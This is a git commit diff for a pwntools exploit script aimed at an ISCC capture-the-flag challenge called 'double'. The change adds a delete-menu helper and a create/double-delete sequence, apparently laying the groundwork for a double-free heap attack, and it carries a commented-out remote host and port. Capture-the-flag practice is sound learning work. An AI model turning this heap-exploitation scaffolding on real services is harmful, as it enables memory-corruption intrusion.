14aafcadb230696d312ba40f577fd1eb41d706e7
CookedMelon <cc2414635846@163.com>
2023-05-08 21:32:14 +0800

    iscc pwn3

--- iscc/double/exp.py
+++ iscc/double/exp.py
@@ -1,8 +1,9 @@
 from pwn import *
 p=process('./double')
-context.log_level='debug'
+# p=remote('59.110.164.72',10021)
+# context.log_level='debug'
 # gdb.attach(p,'b *0x0000000000400BE5')
-pause()
+# pause()
 
 0x6020E0
 0x6024e0
@@ -21,13 +22,31 @@ def edit(index,content):
     p.sendline(str(index).encode())
     p.recvuntil(str('请输入编辑内容：').encode())
     p.sendline(str(content).encode())
-
+def del_(index):
+    p.recvuntil(str("请选择：").encode())
+    p.sendline(b'2')
+    p.recvuntil(str("请输入序号：").encode())
+    p.sendline(str(index).encode())
 def quit_():
     p.recvuntil(str("请选择：").encode())
     p.sendline(b'5')
 
 create(66,0x15CC15CC)
-create(260,0x602228)
+create(3,0x40)
+create(4,0x40)
+create(6,0x40)
+create(5,0x10)
+del_(3)
+del_(3)
+# del_(6)
+# del_(3)
+# create(0,0x440)
+# create(1,0x440)
+# create(2,0x440)
+# del_(4)
+
+# edit(0,b'm'*(0x390-0x2a0)+p64(0)+p64(0x6024e0))
+
 
 # create(82,0xCC51CC51)
 # quit_()
